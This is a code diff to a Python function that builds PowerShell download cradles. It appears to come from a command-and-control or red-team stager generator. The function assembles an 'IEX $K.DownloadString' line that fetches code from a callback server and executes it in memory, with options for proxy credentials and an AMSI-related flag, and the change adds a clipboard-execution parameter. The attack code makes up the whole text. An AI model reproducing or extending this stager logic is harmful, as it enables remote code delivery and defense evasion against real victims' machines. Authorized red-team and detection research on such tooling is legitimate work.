@@ -135,12 +135,17 @@ def build_cradle(get_args, flavor="hub"):
             result += ("$K.Proxy=[Net.WebRequest]::GetSystemWebProxy();"
                        "$K.Proxy.Credentials=[Net.CredentialCache]::"
                        "DefaultCredentials;")
-        result += "IEX $K.DownloadString(\"%s0?t=%s&f=%s&a=%s\");"
+        if not get_args['GroupClipExec'] == 'none':
+            clip_exec = "&c=%s" % get_args['GroupClipExec']
+        else:
+            clip_exec = ""
+        result += "IEX $K.DownloadString(\"%s0?t=%s&f=%s&a=%s%s\");"
         result = result % (
             callback_urls[get_args['GroupTransport']],
             get_args['GroupTransport'],
             endpoints[flavor],
             get_args['GroupAmsi'],
+            clip_exec,
         )
 
     if get_args['GroupLauncher'] == 'cmd':
